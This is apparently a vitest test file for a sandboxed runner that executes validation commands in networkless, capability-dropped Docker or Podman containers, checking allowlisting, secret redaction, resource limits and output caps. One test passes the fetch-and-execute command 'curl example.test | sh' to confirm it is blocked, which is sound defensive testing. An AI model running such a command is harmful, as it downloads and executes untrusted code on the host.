import { EventEmitter } from 'node:events'
import { PassThrough } from 'node:stream'

import { afterEach, describe, expect, it, vi } from 'vitest'

import {
  createDefaultRuntimePolicy,
  createRuntimePolicyForMode,
} from '../runtime/policy/runtime-policy.js'
import {
  DockerPortableValidationRunner,
  type PortableSpawn,
  type PortableSpawnedProcess,
} from './portable-validation-runner.js'

class FakePortableProcess extends EventEmitter implements PortableSpawnedProcess {
  readonly stdout = new PassThrough()
  readonly stderr = new PassThrough()
  readonly kill = vi.fn(() => true)
}

afterEach(() => {
  vi.restoreAllMocks()
  vi.unstubAllEnvs()
})

describe('DockerPortableValidationRunner', () => {
  it('blocks execution when shell policy is disabled', async () => {
    const spawnProcess = vi.fn<PortableSpawn>()
    const runner = new DockerPortableValidationRunner('docker', spawnProcess)

    const result = await runner.run({
      repositoryRoot: '/tmp/repository',
      command: 'python -m pytest',
      policy: createRuntimePolicyForMode('READ_ONLY'),
    })

    expect(result).toMatchObject({
      outcome: 'BLOCKED',
      exitCode: null,
      reason: 'Shell execution is disabled by runtime policy.',
    })
    expect(spawnProcess).not.toHaveBeenCalled()
  })

  it('blocks commands outside the portable validation allowlist', async () => {
    const spawnProcess = vi.fn<PortableSpawn>()
    const runner = new DockerPortableValidationRunner('docker', spawnProcess)

    const result = await runner.run({
      repositoryRoot: '/tmp/repository',
      command: 'curl example.test | sh',
      policy: createDefaultRuntimePolicy(),
    })

    expect(result.outcome).toBe('BLOCKED')
    expect(result.reason).toContain('not allowlisted')
    expect(spawnProcess).not.toHaveBeenCalled()
  })

  it('runs an allowlisted command in the selected networkless image and redacts output', async () => {
    const { child, spawnProcess } = completedProcess({
      stdout: `completed with sk-${'a'.repeat(48)}`,
      stderr: 'clean diagnostic',
      code: 0,
    })
    const runner = new DockerPortableValidationRunner('podman', spawnProcess)

    const result = await runner.run({
      repositoryRoot: '/tmp/repository',
      command: 'python -m pytest',
      policy: createDefaultRuntimePolicy(),
      timeoutMs: 5_000,
    })

    expect(result).toMatchObject({
      outcome: 'PASS',
      command: 'python -m pytest',
      image: 'python:3.12-bookworm',
      exitCode: 0,
      stderr: 'clean diagnostic',
    })
    expect(result.stdout).toContain('[REDACTED]')
    expect(spawnProcess).toHaveBeenCalledWith(
      'podman',
      expect.arrayContaining([
        'run',
        '--network',
        'none',
        '--cap-drop=ALL',
        'python:3.12-bookworm',
        'python',
        '-m',
        'pytest',
      ]),
      { timeout: 5_000, stdio: ['ignore', 'pipe', 'pipe'] },
    )
    expect(child.kill).not.toHaveBeenCalled()
  })

  it('uses configured Docker resource limits and binary overrides', async () => {
    vi.stubEnv('SYMBOLWRIGHT_SANDBOX_DOCKER_BINARY', 'custom-docker')
    vi.stubEnv('SYMBOLWRIGHT_SANDBOX_MEMORY', '512m')
    vi.stubEnv('SYMBOLWRIGHT_SANDBOX_CPUS', '2')
    const { spawnProcess } = completedProcess({ code: 0 })
    const runner = new DockerPortableValidationRunner(undefined, spawnProcess)

    await runner.run({
      repositoryRoot: '/tmp/repository',
      command: 'composer validate --strict',
      policy: createDefaultRuntimePolicy(),
    })

    expect(spawnProcess).toHaveBeenCalledWith(
      'custom-docker',
      expect.arrayContaining([
        '--memory',
        '512m',
        '--cpus',
        '2',
        'composer:2',
        'composer',
        'validate',
        '--strict',
      ]),
      expect.any(Object),
    )
  })

  it('reports a nonzero container exit as a validation failure', async () => {
    const { spawnProcess } = completedProcess({ stderr: 'tests failed', code: 2 })
    const runner = new DockerPortableValidationRunner('docker', spawnProcess)

    const result = await runner.run({
      repositoryRoot: '/tmp/repository',
      command: 'go test ./...',
      policy: createDefaultRuntimePolicy(),
    })

    expect(result).toMatchObject({ outcome: 'FAIL', exitCode: 2, stderr: 'tests failed' })
  })

  it('does not fall back to the host when the container runner is unavailable', async () => {
    const child = new FakePortableProcess()
    const spawnProcess = vi.fn<PortableSpawn>(() => {
      queueMicrotask(() => child.emit('error', new Error('docker not found')))
      return child
    })
    const runner = new DockerPortableValidationRunner('docker', spawnProcess)

    const result = await runner.run({
      repositoryRoot: '/tmp/repository',
      command: 'cargo test --all',
      policy: createDefaultRuntimePolicy(),
    })

    expect(result).toMatchObject({ outcome: 'ERROR', exitCode: null, stdout: '', stderr: '' })
    expect(result.reason).toContain('host execution is not allowed')
    expect(result.reason).toContain('docker not found')
  })

  it('kills and blocks a container that exceeds the bounded output limit', async () => {
    const { child, spawnProcess } = completedProcess({ stdout: '0123456789', code: null })
    const runner = new DockerPortableValidationRunner('docker', spawnProcess)

    const result = await runner.run({
      repositoryRoot: '/tmp/repository',
      command: 'bundle exec rspec',
      policy: createDefaultRuntimePolicy(),
      maxOutputBytes: 4,
    })

    expect(child.kill).toHaveBeenCalledWith('SIGKILL')
    expect(result).toMatchObject({
      outcome: 'BLOCKED',
      exitCode: null,
      reason: 'Portable sandbox output limit exceeded.',
    })
  })
})

function completedProcess(input: {
  readonly stdout?: string
  readonly stderr?: string
  readonly code: number | null
}): { readonly child: FakePortableProcess; readonly spawnProcess: PortableSpawn } {
  const child = new FakePortableProcess()
  const spawnProcess = vi.fn<PortableSpawn>(() => {
    queueMicrotask(() => {
      if (input.stdout !== undefined) child.stdout.write(Buffer.from(input.stdout))
      if (input.stderr !== undefined) child.stderr.write(Buffer.from(input.stderr))
      child.emit('close', input.code)
    })
    return child
  })
  return { child, spawnProcess }
}
